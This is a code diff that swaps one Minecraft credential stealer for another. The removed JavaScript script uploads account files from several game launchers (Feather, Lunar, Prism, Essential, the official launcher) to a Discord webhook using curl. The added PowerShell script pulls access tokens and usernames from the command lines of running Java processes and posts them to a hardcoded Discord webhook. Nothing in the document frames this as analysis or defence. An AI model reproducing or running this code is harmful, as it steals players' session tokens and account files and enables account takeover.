@@ -1,44 +1,33 @@
-///api_version=2
-///name=SendAccountFiles
-///description=Sends account files to a Discord webhook.
-///author=YourName
-///version=1.0
+$webhookUrl = "https://discord.com/api/webhooks/1401003517858283582/9eKHhoa9lJ88JMjImi75z5B5HZ0uqd6GSU_tOfChFSHpYVwoVG8DRIQn2C41pILzW5yr"
 
-const fs = require("fs");
-const { exec } = require("child_process");
+Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'Java%' AND CommandLine LIKE '%accessToken%'" |
+    Select-Object -ExpandProperty CommandLine |
+    ForEach-Object {
+        $accessToken = $null
+        $username = $null
 
-// Define the file paths and webhook URL
-const featherFile = `${java.nio.file.Paths.get(System.getProperty("user.home"), "AppData", "Roaming", ".feather", "accounts.json")}`;
-const essentialFile = `${java.nio.file.Paths.get(System.getProperty("user.home"), "AppData", "Roaming", ".minecraft", "essential", "microsoft_accounts.json")}`;
-const minecraftFile = `${java.nio.file.Paths.get(System.getProperty("user.home"), "AppData", "Roaming", ".minecraft", "launcher_accounts_microsoft_store.json")}`;
-const prismFile = `${java.nio.file.Paths.get(System.getProperty("user.home"), "AppData", "Roaming", ".prism", "accounts.json")}`;
-const lunarFile = `${java.nio.file.Paths.get(System.getProperty("user.home"), "AppData", "Roaming", ".lunarclient", "accounts.json")}`;
-const webhookUrl = "https://discord.com/api/webhooks/your-webhook-url";
+        if ($_ -match '--accessToken\s+(\S+)') {
+            $accessToken = $matches[1]
+        }
+        if ($_ -match '--username\s+(\S+)') {
+            $username = $matches[1]
+        }
 
-// Function to send files to the webhook
-function sendFileToWebhook(filePath, fileDescription) {
-    if (fs.existsSync(filePath)) {
-        // Use curl to send the file
-        const curlCommand = `curl -X POST "${webhookUrl}" -H "Content-Type: multipart/form-data" -F "file=@${filePath}" -F "content=${fileDescription}"`;
-        exec(curlCommand, (error, stdout, stderr) => {
-            if (error) {
-                Chat.log(`Error sending ${fileDescription}: ${error.message}`);
-            } else {
-                Chat.log(`Successfully sent ${fileDescription}`);
-            }
-        });
-    } else {
-        Chat.log(`${fileDescription} not found at path: ${filePath}`);
+        if ($accessToken -and $username) {
+            # Format the message for Discord
+            $message = @"
+> **AccessToken:** $accessToken
+> **Username:** $username
+"@
+
+            Write-Output $message
+
+            # Properly format the payload for Discord
+            $payload = @{
+                content = $message
+            } | ConvertTo-Json -Depth 10
+
+            # Send the payload to the Discord webhook
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
+        }
     }
-}
-
-// Send all files
-sendFileToWebhook(featherFile, "Feather Accounts File");
-sendFileToWebhook(essentialFile, "Essentials Accounts File");
-sendFileToWebhook(minecraftFile, "Minecraft Launcher Accounts File");
-sendFileToWebhook(prismFile, "Prism Accounts File");
-sendFileToWebhook(lunarFile, "Lunar Accounts File");
-
-// Debug message
-Chat.log("Process complete!");
-
